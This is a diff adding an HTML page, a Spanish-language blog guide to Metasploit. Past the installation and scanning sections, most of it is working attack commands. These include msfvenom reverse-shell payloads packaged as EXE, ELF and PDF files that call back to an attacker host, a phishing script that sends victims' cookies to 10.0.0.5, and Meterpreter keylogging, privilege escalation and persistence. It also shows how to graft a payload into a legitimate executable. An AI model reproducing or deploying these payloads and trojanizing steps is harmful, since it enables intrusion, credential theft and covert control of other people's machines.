@@ -1,0 +1,147 @@
+```html
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Metasploit: Directo al código – Guía Práctica</title>
+  <style>
+    body { font-family: Arial, sans-serif; line-height: 1.6; padding: 20px; max-width: 800px; margin: auto; }
+    pre { background: #f4f4f4; padding: 10px; overflow-x: auto; }
+    code { font-family: "Courier New", Courier, monospace; }
+    h1, h2 { color: #333; }
+    hr { border: none; border-top: 1px solid #ccc; margin: 20px 0; }
+  </style>
+</head>
+<body>
+  <h1>Metasploit: Directo al código – Guía Práctica</h1>
+  <p>Esta guía recopila de forma íntegra los puntos desarrollados, con ejemplos claros para tu blog.</p>
+  <hr />
+  <h2>1. Instalación de Metasploit</h2>
+  <p><strong>Descripción:</strong> Cómo descargar e instalar Metasploit Framework en Windows.</p>
+  <pre><code class="language-powershell"># 1. Descargar el instalador desde el sitio oficial
+# 2. Ejecutar Metasploit-latest-windows-installer.exe y seguir el asistente
+
+# 3. Verificar que msfconsole esté accesible:
+C:\> msfconsole --version
+# Framework Version: 6.2.0-dev</code></pre>
+  <p>Tras la instalación, <code>msfconsole.bat</code> queda en <code>C:\metasploit-framework\</code>.</p>
+  <hr />
+
+  <h2>2. Configuración y fundamentos</h2>
+  <p><strong>Descripción:</strong> Poner en marcha la base de datos y aprender los comandos básicos.</p>
+  <pre><code class="language-powershell"># Iniciar el servicio de PostgreSQL
+C:\> net start postgresql
+
+# Entrar en msfconsole y comprobar conexión a la base de datos:
+C:\> msfconsole
+msf6 &gt; db_status
+[*] postgresql connected to msf
+
+# Comandos básicos:
+msf6 &gt; help               # Listar opciones
+msf6 &gt; search smb         # Buscar módulos SMB
+msf6 &gt; use exploit/windows/smb/ms17_010_eternalblue
+msf6 exploit(...) &gt; show options</code></pre>
+  <hr />
+
+  <h2>3. Exploits y Payloads</h2>
+  <p><strong>Descripción:</strong> Tipos de exploits, payloads y generación con <code>msfvenom</code>.</p>
+  <pre><code># Generar ejecutable .exe con Meterpreter inverso
+msfvenom -p windows/meterpreter/reverse_tcp \
+        LHOST=192.168.1.10 LPORT=4444 \
+        -f exe -o shell.exe
+
+# Configurar handler en msfconsole
+msf6 &gt; use exploit/multi/handler
+msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp
+msf6 exploit(...) &gt; set LHOST 192.168.1.10
+msf6 exploit(...) &gt; set LPORT 4444
+msf6 exploit(...) &gt; run</code></pre>
+  <p>Al ejecutar <code>shell.exe</code>, obtendrás una sesión Meterpreter:</p>
+  <pre><code>[*] Meterpreter session 1 opened (192.168.1.10:4444 → 192.168.1.20:1234)</code></pre>
+  <hr />
+
+  <h2>4. Recopilación de información</h2>
+  <p><strong>Descripción:</strong> Escaneo de puertos y detección de vulnerabilidades con Nmap y Nessus.</p>
+  <pre><code># Escaneo rápido de puertos TCP
+msf6 &gt; db_nmap -sT -p 1-1000 192.168.1.0/24
+
+# Escaneo con scripts de vulnerabilidad
+msf6 &gt; db_nmap -sV --script vuln 192.168.1.105</code></pre>
+  <p>Ver resultados:</p>
+  <pre><code>msf6 &gt; hosts    # Hosts descubiertos
+msf6 &gt; services # Servicios y puertos
+msf6 &gt; vulns    # Vulnerabilidades detectadas</code></pre>
+  <p>Para importar un informe de Nessus:</p>
+  <pre><code>msf6 &gt; db_import /ruta/a/nessus_report.xml</code></pre>
+  <hr />
+
+  <h2>5. Ataques del lado del cliente</h2>
+  <p><strong>Descripción:</strong> Generar troyanos y documentos maliciosos.</p>
+  <pre><code># Backdoor Linux x86
+msfvenom -p linux/x86/meterpreter/reverse_tcp \
+        LHOST=10.0.0.5 LPORT=5555 \
+        -f elf -o backdoor.elf
+
+# Virus PDF para Windows
+msfvenom -p windows/meterpreter/reverse_tcp \
+        LHOST=10.0.0.5 LPORT=5555 \
+        -f pdf -o doc_infectado.pdf</code></pre>
+  <p><strong>Phishing</strong>: clona la página, añade un &lt;script&gt; para capturar cookies:</p>
+  <pre><code>&lt;script&gt;
+  new Image().src = "http://10.0.0.5:8080/collect?cookie=" + document.cookie;
+&lt;/script&gt;</code></pre>
+  <hr />
+
+  <h2>6. Post-explotación</h2>
+  <p><strong>Descripción:</strong> Escalada de privilegios, recolección y persistencia.</p>
+  <pre><code># Información del sistema
+meterpreter &gt; sysinfo
+
+# Subir/descargar ficheros
+meterpreter &gt; upload local_tool.exe C:\Windows\Temp\tool.exe
+meterpreter &gt; download C:\Ruta\log.txt ./log.txt
+
+# Captura de pantalla
+meterpreter &gt; screenshot
+
+# Búsqueda de archivos
+meterpreter &gt; search -f *.docx
+
+# Escalada de privilegios
+meterpreter &gt; run post/windows/escalate/getsystem
+
+# Keylogging
+meterpreter &gt; keylog_start
+
+# Persistencia
+meterpreter &gt; run persistence -U -i 10 -p 4444 -r 10.0.0.5</code></pre>
+  <hr />
+
+  <h2>7. Uso avanzado de Metasploit</h2>
+  <p><strong>Descripción:</strong> Ocultar payloads y usar Armitage.</p>
+  <pre><code># Injertar payload en ejecutable legítimo
+msfvenom -x original.exe \
+         -p windows/meterpreter/reverse_tcp \
+         LHOST=10.0.0.5 LPORT=4444 \
+         -k -f exe -o modificado.exe</code></pre>
+  <p><strong>Armitage:</strong></p>
+  <ol>
+    <li>Inicia PostgreSQL y Metasploit.</li>
+    <li>Ejecuta <code>armitage</code>.</li>
+    <li>Conecta y añade hosts con la interfaz gráfica.</li>
+  </ol>
+  <hr />
+
+  <h2>8. Recomendaciones finales</h2>
+  <ul>
+    <li>Aísla tus pruebas en VM.</li>
+    <li>Actualiza Metasploit periódicamente:<br /><code>msf6 &gt; msfupdate</code></li>
+    <li>Documenta cada paso.</li>
+    <li>Consulta la <a href="https://docs.metasploit.com" target="_blank">documentación oficial</a>.</li>
+    <li>Explora módulos en GitHub: <code>metasploit-framework/modules</code>.</li>
+  </ul>
+</body>
+</html>
+```
